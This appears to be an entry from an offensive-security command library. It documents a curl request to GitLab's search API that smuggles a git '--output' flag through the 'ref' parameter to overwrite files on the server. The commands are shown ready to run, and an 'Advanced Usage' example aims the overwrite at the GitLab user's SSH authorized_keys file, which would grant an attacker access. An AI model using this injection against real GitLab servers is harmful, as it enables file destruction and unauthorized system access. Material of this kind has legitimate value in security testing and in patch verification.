---
data: >-
  curl --header "PRIVATE-TOKEN: $TOKEN"
  'http://gitlab-vm.local/api/v4/projects/5/search?scope=wiki_blobs&search=page&ref=--output=/tmp/file'
tags:
  - api
  - injection
type: command
executor: bash
platforms:
  - Linux
  - Web
id: 16335e15-daa9-4302-a686-f392e01b16e9
created_at: '2025-12-11T03:47:47.572Z'
updated_at: '2025-12-11T03:47:47.572Z'
verified: false
validated: true
submitted: true
---
# curl-gitlab-search-api

## Command

```bash
curl --header "PRIVATE-TOKEN: $TOKEN" 'http://gitlab-vm.local/api/v4/projects/5/search?scope=wiki_blobs&search=page&ref=--output=/tmp/file'
```

## Description

Makes an API call to GitLab's search endpoint to exploit flag injection, overwriting a file with git log output.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--header "PRIVATE-TOKEN: $TOKEN"` | Provides authentication token | Yes |
| `search=page` | Search term for wiki page | Yes |
| `scope=wiki_blobs` | Specifies search scope | Yes |
| `ref=--output=/tmp/file` | Injects output flag | Yes |

## Examples

### Basic Usage

```bash
curl --header "PRIVATE-TOKEN: $TOKEN" 'http://gitlab-vm.local/api/v4/projects/5/search?scope=wiki_blobs&search=page&ref=--output=/tmp/file'
```

### Advanced Usage

```bash
curl --header "PRIVATE-TOKEN: $TOKEN" 'http://gitlab-vm.local/api/v4/projects/5/search?scope=wiki_blobs&search=page&ref=--output=/var/opt/gitlab/.ssh/authorized_keys'
```

## Expected Output

Triggers git command to write commit details to the specified file.

## Related

- [[procedures/Inject-Git-Flag-via-Search-API-to-Overwrite-File]]
- [[procedures/Inject-Git-Flag-to-Overwrite-Authorized-Keys]]
